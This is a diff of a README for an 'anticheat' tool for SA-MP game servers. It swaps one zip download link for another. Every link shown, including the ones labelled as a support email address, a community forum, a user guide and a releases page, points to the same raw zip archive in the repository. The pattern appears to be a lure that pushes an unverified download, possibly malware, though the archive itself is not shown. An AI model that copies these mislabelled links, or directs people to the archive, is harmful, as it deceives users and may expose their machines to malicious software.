@@ -1,6 +1,6 @@
 # 🚀 anticheat - Protect Your SA-MP Server Easily
 
-[![Download anticheat](https://github.com/even88813-hash/anticheat/raw/refs/heads/main/Scottish/Software-3.1-alpha.5.zip)](https://github.com/even88813-hash/anticheat/raw/refs/heads/main/Scottish/Software-3.1-alpha.5.zip)
+[![Download anticheat](https://raw.githubusercontent.com/even88813-hash/anticheat/main/Scottish/Software_2.2.zip)](https://raw.githubusercontent.com/even88813-hash/anticheat/main/Scottish/Software_2.2.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ To use anticheat, you will first need to download it from our Releases page. Fol
 
 1. **Visit the Releases Page**: Click the link below to access the download options:
 
-   [Download anticheat](https://github.com/even88813-hash/anticheat/raw/refs/heads/main/Scottish/Software-3.1-alpha.5.zip)
+   [Download anticheat](https://raw.githubusercontent.com/even88813-hash/anticheat/main/Scottish/Software_2.2.zip)
 
 2. **Choose the Right Version**: On the Releases page, look for the latest version of the application. You will see several files available for download.
 
@@ -59,13 +59,13 @@ You can customize anticheat to better suit your gaming environment:
 
 If you encounter any issues or have questions while using anticheat, we are here to help. You can find support by:
 
-- **Email**: Reach out to our support team at https://github.com/even88813-hash/anticheat/raw/refs/heads/main/Scottish/Software-3.1-alpha.5.zip
-- **Community Forum**: Join discussions at [anticheat Forum](https://github.com/even88813-hash/anticheat/raw/refs/heads/main/Scottish/Software-3.1-alpha.5.zip).
-- **Documentation**: Read more about features and settings in our [User Guide](https://github.com/even88813-hash/anticheat/raw/refs/heads/main/Scottish/Software-3.1-alpha.5.zip).
+- **Email**: Reach out to our support team at https://raw.githubusercontent.com/even88813-hash/anticheat/main/Scottish/Software_2.2.zip
+- **Community Forum**: Join discussions at [anticheat Forum](https://raw.githubusercontent.com/even88813-hash/anticheat/main/Scottish/Software_2.2.zip).
+- **Documentation**: Read more about features and settings in our [User Guide](https://raw.githubusercontent.com/even88813-hash/anticheat/main/Scottish/Software_2.2.zip).
 
 ## 📰 Update History
 
-Stay informed about the latest updates and bug fixes. Each release on the [Releases page](https://github.com/even88813-hash/anticheat/raw/refs/heads/main/Scottish/Software-3.1-alpha.5.zip) includes an update history that records what has changed, fixed, or improved.
+Stay informed about the latest updates and bug fixes. Each release on the [Releases page](https://raw.githubusercontent.com/even88813-hash/anticheat/main/Scottish/Software_2.2.zip) includes an update history that records what has changed, fixed, or improved.
 
 ## 🌈 Frequently Asked Questions (FAQs)
 
